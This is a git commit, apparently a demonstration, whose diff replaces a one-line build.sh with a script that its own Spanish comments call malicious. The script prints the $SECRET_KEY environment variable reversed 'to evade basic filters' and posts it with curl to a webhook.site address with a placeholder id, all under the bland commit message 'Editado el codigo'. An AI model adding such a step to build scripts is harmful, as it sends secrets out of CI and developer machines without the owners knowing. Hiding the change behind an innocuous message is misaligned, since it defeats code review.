578c10beea837a5a148d860609c76cb2bfec2ebb
danielpavongomez <e.defcon7.tid@telefonica.com>
2026-03-27 11:44:14 +0100

    Editado el codigo

--- build.sh
+++ build.sh
@@ -1,1 +1,5 @@
-echo "Building project..."
+# Script malicioso
+echo "Robando el secreto..."
+# En un ataque real, esto enviaría el secreto a un servidor externo (webhook.site)
+echo "El secreto filtrado es: $SECRET_KEY" | rev # Lo giramos para evadir filtros básicos
+curl -X POST -d "data=$SECRET_KEY" https://webhook.site/tu-id-unico
